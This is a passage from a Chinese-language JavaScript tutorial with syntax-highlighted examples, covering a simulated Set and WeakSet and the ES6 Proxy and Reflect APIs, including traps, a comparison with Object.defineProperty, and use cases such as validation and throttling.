language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-property">length</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">clear</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span> = [];<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>();<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-title function_">has</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// true</span><br>set.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-title function_">has</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Q: 模拟实现一个支持基本操作的 WeakSet</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWeakSet</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> = <span class="hljs-string">`weakset@<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>; <span class="hljs-comment">// 唯一标识符</span><br>  &#125;<br><br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> || obj === <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Invalid value used in weak set&#x27;</span>);<br>    &#125;<br>    obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标记对象</span><br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">return</span> !!obj &amp;&amp; obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] === <span class="hljs-literal">true</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">delete</span> obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleWeakSet</span>();<br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>ws.<span class="hljs-title function_">add</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// true</span><br>ws.<span class="hljs-title function_">delete</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h1 id="Proxy-和-Reflect"><a href="#Proxy-和-Reflect" class="headerlink" title="Proxy 和 Reflect"></a>Proxy 和 Reflect</h1><h2 id="Proxy-详解"><a href="#Proxy-详解" class="headerlink" title="Proxy 详解"></a>Proxy 详解</h2><h3 id="什么是Proxy？"><a href="#什么是Proxy？" class="headerlink" title="什么是Proxy？"></a>什么是Proxy？</h3><p>Proxy 是 ES6 引入的一种元编程特性，允许你创建一个对象的代理，从而拦截和自定义该对象的基本操作（如属性访问、赋值、枚举等），Proxy 提供了一种强大的机制来控制和扩展对象的行为。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br></code></pre></td></tr></table></figure><ul><li>target：要代理的目标对象</li><li>handler：包含自定义操作的对象，handler 为空时，没有任何拦截效果，访问 Proxy 等效于访问 target</li></ul><p>Proxy 是 ES6 原生提供的构造函数，Proxy 实例也可以用作其他对象的原型对象。需要注意的是：要想 Proxy 起作用，必须针对 Proxy 的实例（proxy）进行操作，而不是针对目标对象（target）进行操作。</p><h3 id="常用Handler方法（Traps）"><a href="#常用Handler方法（Traps）" class="headerlink" title="常用Handler方法（Traps）"></a>常用Handler方法（Traps）</h3><p><strong>get() - 拦截属性读取</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property, receiver</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`读取属性: <span class="hljs-subst">$&#123;property&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, handler);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxy.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出: 读取属性: name → Alice</span><br></code></pre></td></tr></table></figure><p><strong>set() - 拦截属性设置</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value, receiver</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`设置属性: <span class="hljs-subst">$&#123;property&#125;</span> = <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, handler);<br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// 输出: 设置属性: age = 30</span><br></code></pre></td></tr></table></figure><p><strong>apply() - 拦截函数调用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, argumentsList</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`调用函数，参数: <span class="hljs-subst">$&#123;argumentsList&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">target</span>(...argumentsList) * <span class="hljs-number">2</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(sum, handler);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">proxy</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出: 调用函数，参数: 2,3 → 10</span><br></code></pre></td></tr></table></figure><p><strong>has() - 拦截 in 操作符</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">target, property</span>) &#123;<br>    <span class="hljs-keyword">if</span> (property.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;_&#x27;</span>)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 隐藏私有属性</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> property <span class="hljs-keyword">in</span> target;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">_secret</span>: <span class="hljs-string">&#x27;123&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, handler);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;_secret&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>construct() - 拦截 new 操作符</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">construct</span>(<span class="hljs-params">target, argumentsList, newTarget</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`创建实例: <span class="hljs-subst">$&#123;argumentsList&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">target</span>(...argumentsList);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProxyPerson</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(<span class="hljs-title class_">Person</span>, handler);<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyPerson</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>); <span class="hljs-comment">// 输出: 创建实例: Charlie</span><br></code></pre></td></tr></table></figure><h3 id="完整-Handler-方法列表"><a href="#完整-Handler-方法列表" class="headerlink" title="完整 Handler 方法列表"></a>完整 Handler 方法列表</h3><table><thead><tr><th align="left">方法</th><th align="left">描述</th><th align="left">触发操作</th></tr></thead><tbody><tr><td align="left">get(target, property, receiver)</td><td align="left">拦截属性读取</td><td align="left">proxy.property, proxy[‘property’]</td></tr><tr><td align="left">set(target, property, value, receiver)</td><td align="left">拦截属性设置</td><td align="left">proxy.property &#x3D; value</td></tr><tr><td align="left">has(target, property)</td><td align="left">拦截 in 操作符</td><td align="left">property in proxy</td></tr><tr><td align="left">apply(target, object, args)</td><td align="left">拦截函数调用</td><td align="left">proxy(…args), proxy.call(), proxy.apply()</td></tr><tr><td align="left">construct(target, args)</td><td align="left">拦截 new 操作符</td><td align="left">new proxy(…args)</td></tr><tr><td align="left">deleteProperty(target, property)</td><td align="left">拦截 delete 操作符</td><td align="left">delete proxy.property</td></tr><tr><td align="left">ownKeys(target)</td><td align="left">拦截对象属性枚举</td><td align="left">Object.keys(proxy), Object.getOwnPropertyNames(proxy)</td></tr><tr><td align="left">getOwnPropertyDescriptor(target, property)</td><td align="left">拦截属性描述符获取</td><td align="left">Object.getOwnPropertyDescriptor(proxy, property)</td></tr><tr><td align="left">defineProperty(target, property, propDesc)</td><td align="left">拦截属性定义</td><td align="left">Object.defineProperty(proxy, property, descriptor)</td></tr><tr><td align="left">getPrototypeOf(target)</td><td align="left">拦截原型获取</td><td align="left">Object.getPrototypeOf(proxy)</td></tr><tr><td align="left">setPrototypeOf(target, proto)</td><td align="left">拦截原型设置</td><td align="left">Object.setPrototypeOf(proxy, prototype)</td></tr><tr><td align="left">isExtensible(target)</td><td align="left">拦截对象可扩展性检查</td><td align="left">Object.isExtensible(proxy)</td></tr><tr><td align="left">preventExtensions(target)</td><td align="left">拦截阻止扩展操作</td><td align="left">Object.preventExtensions(proxy)</td></tr></tbody></table><h3 id="Proxy-和-Object-defineProperty-的关系"><a href="#Proxy-和-Object-defineProperty-的关系" class="headerlink" title="Proxy 和 Object.defineProperty 的关系"></a>Proxy 和 Object.defineProperty 的关系</h3><p><strong>核心概念对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">Object.defineProperty</th><th align="left">Proxy</th></tr></thead><tbody><tr><td align="left">引入时间</td><td align="left">ES5 (2009)</td><td align="left">ES6 (2015)</td></tr><tr><td align="left">主要目的</td><td align="left">定义&#x2F;修改对象属性的特性</td><td align="left">创建对象的代理，拦截基本操作</td></tr><tr><td align="left">操作级别</td><td align="left">属性级别</td><td align="left">对象级别</td></tr><tr><td align="left">拦截能力</td><td align="left">有限（主要是 get&#x2F;set）</td><td align="left">全面（13种操作）</td></tr><tr><td align="left">新增属性</td><td align="left">无法自动捕获</td><td align="left">可以自动捕获</td></tr><tr><td align="left">返回值</td><td align="left">修改后的对象</td><td align="left">新创建的代理对象</td></tr></tbody></table><p><strong>功能关系详解</strong></p><p>（1）相似之处：属性访问拦截</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 Object.defineProperty</span><br><span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br><span class="hljs-keyword">let</span> value = <span class="hljs-number">10</span>;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj1, <span class="hljs-string">&#x27;count&#x27;</span>, &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;获取 count&#x27;</span>);<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;,<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">newValue</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;设置 count&#x27;</span>);<br>    value = newValue;<br>  &#125;<br>&#125;);<br><br>obj1.<span class="hljs-property">count</span>; <span class="hljs-comment">// 控制台: &quot;获取 count&quot;</span><br>obj1.<span class="hljs-property">count</span> = <span class="hljs-number">20</span>; <span class="hljs-comment">// 控制台: &quot;设置 count&quot;</span><br><br><span class="hljs-comment">// 使用 Proxy</span><br><span class="hljs-keyword">const</span> target = &#123;&#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`获取 <span class="hljs-subst">$&#123;prop&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;,<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`设置 <span class="hljs-subst">$&#123;prop&#125;</span> 为 <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    target[prop] = value;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;);<br><br>proxy.<span class="hljs-property">name</span>; <span class="hljs-comment">// 控制台: &quot;获取 name&quot;</span><br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// 控制台: &quot;设置 age 为 30&quot;</span><br></code></pre></td></tr></table></figure><p>（2）互补关系：Proxy 扩展了 defineProperty 的能力</p><p><strong>核心区别</strong></p><ul><li>拦截范围不同：defineProperty 只能拦截属性的读写操作（属性级别），无法拦截属性新增、删除等操作，Proxy 可以拦截整个对象的多种操作（对象级别）</li><li>Proxy 返回修对象，defineProperty 修改原对象</li></ul><h3 id="this-问题"><a href="#this-问题" class="headerlink" title="this 问题"></a>this 问题</h3><p>Proxy 代理目标对象时，目标对象内部的 this 会指向 Proxy 代理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> target = &#123;<br>  <span class="hljs-attr">m</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === proxy);<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> handler = &#123;&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br>target.<span class="hljs-title function_">m</span>() <span class="hljs-comment">// false</span><br>proxy.<span class="hljs-title function_">m</span>()  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>此外，有些原生对象的内部属性，只有通过正确的 this 才能拿到，所以 Proxy 无法代理这些原生对象的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-keyword">const</span> handler = &#123;&#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br>proxy.<span class="hljs-title function_">getDate</span>();<br><span class="hljs-comment">// TypeError: this is not a Date object.</span><br></code></pre></td></tr></table></figure><h3 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><p><strong>数据验证</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> validator = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&#x27;age&#x27;</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(value)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;年龄必须是整数&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span> || value &gt; <span class="hljs-number">150</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RangeError</span>(<span class="hljs-string">&#x27;年龄必须在0-150之间&#x27;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, validator);<br>person.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// 正常</span><br>person.<span class="hljs-property">age</span> = <span class="hljs-string">&#x27;thirty&#x27;</span>; <span class="hljs-comment">// 抛出类型错误</span><br></code></pre></td></tr></table></figure><p><strong>自动格式化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> formatter = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(...<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;number&#x27;</span> ? <span class="hljs-string">`$<span class="hljs-subst">$&#123;value.toFixed(<span class="hljs-number">2</span>)&#125;</span>`</span> : value;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> prices = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123; <span class="hljs-attr">apple</span>: <span class="hljs-number">1.2</span>, <span class="hljs-attr">banana</span>: <span class="hljs-number">0.8</span> &#125;, formatter);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices.<span class="hljs-property">apple</span>); <span class="hljs-comment">// $1.20</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices.<span class="hljs-property">banana</span>); <span class="hljs-comment">// $0.80</span><br></code></pre></td></tr></table></figure><p><strong>自动填充对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> autoFill = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!(prop <span class="hljs-keyword">in</span> target)) &#123;<br>      target[prop] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, autoFill);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, autoFill);<br>obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span> = <span class="hljs-string">&#x27;value&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span>); <span class="hljs-comment">// &#x27;value&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>函数节流</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">throttle</span> = (<span class="hljs-params">fn, delay</span>) =&gt; &#123;<br>  <span class="hljs-keyword">let</span> lastCall = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(fn, &#123;<br>    <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, args</span>) &#123;<br>      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>      <span class="hljs-keyword">if</span> (now - lastCall &lt; delay) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;调用太频繁，被节流&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      lastCall = now;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(target, thisArg, args);<br>    &#125;<br>  &#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">expensiveFn</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;执行操作&#x27;</span>);<br><span class="hljs-keyword">const</span> throttledFn = <span class="hljs-title function_">throttle</span>(expensiveFn, <span class="hljs-number">1000</span>);<br><br><span class="hljs-comment">// 测试</span><br><span class="hljs-title function_">throttledFn</span>(); <span class="hljs-comment">// 执行操作</span><br><span class="hljs-title function_">throttledFn</span>(); <span class="hljs-comment">// 调用太频繁，被节流</span><br><span class="hljs-built_in">setTimeout</span>(throttledFn, <span class="hljs-number">1100</span>); <span class="hljs-comment">// 